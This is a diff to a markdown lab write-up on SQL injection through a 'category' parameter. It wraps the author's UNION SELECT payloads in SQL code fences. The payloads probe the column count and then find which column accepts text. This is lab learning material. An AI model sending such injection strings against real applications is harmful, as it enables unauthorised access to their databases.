@@ -17,21 +17,21 @@ The application was vulnerable to SQL injection through the `category` parameter
 ## Solution
 
 First, I determined that the original query returned **three columns** by using:
-
+```SQL
     ' UNION SELECT NULL,NULL,NULL--
-
+```
 I then replaced each `NULL` value one at a time with the random string provided by the lab:
-
+```SQL
     ' UNION SELECT 'abcdef',NULL,NULL--
-
+```
 If an error occurred, I moved the string to the next column:
-
+```SQL
     ' UNION SELECT NULL,'abcdef',NULL--
-
+```
 Then:
-
+```SQL
     ' UNION SELECT NULL,NULL,'abcdef'--
-
+```
 When the random value appeared successfully in the response, I identified the column that was compatible with **text data**.
 
 ## Key Learning
